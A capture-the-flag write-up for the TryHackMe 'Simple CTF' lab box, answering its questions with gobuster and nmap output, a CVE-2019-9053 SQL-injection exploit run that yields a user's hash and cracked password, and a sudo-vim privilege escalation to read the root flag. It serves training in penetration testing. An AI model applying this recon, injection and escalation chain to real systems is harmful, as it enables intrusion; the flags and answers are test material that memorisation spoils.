# Simple CTF

## Task 1 Simple CTF
```
export IP=10.10.220.110
```

**gobuster:**
```bash
jeffrowell@kali:~/Documents/TryHackMe/Simple CTF$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.220.110
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/22 17:44:04 Starting gobuster
===============================================================
/simple (Status: 301)
===============================================================
2020/05/22 18:05:36 Finished
===============================================================
```

### 1. How many services are running under port 1000?
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-22 17:42 MDT
Nmap scan report for 10.10.220.110
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.21.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.13 seconds
```


### 2. What is running on the higher port?

```
SSH
```

### 3. What's the CVE you're using against the application?
```
CVE-2019-9053
```

### 4. To what kind of vulnerability is the application vulnerable?
```
SQLi
```

### 5. What's the password?
Running [CVE-2019-9053 exploit](https://www.exploit-db.com/exploits/46635) script with flags `-u`, `--crack`, and `--wordlist` gives us the following information:
```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

### 6. Where can you login with the details obtained?
```
SSH
```

### 7. What's the user flag?
```bash
$ cat user.txt
G00d j0b, keep up!
```

### 8. Is there any other user in the home directory? What's its name?
```
sunbath
```

```bash
$ ls /home
mitch  sunbath
```

### 9. What can you leverage to spawn a privileged shell?
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

### 10. What's the root flag?
```bash
$ sudo vim /root/root.txt
```

![root](https://user-images.githubusercontent.com/32188816/82718485-00a79e80-9c60-11ea-8715-c73b7aa87bf2.png)
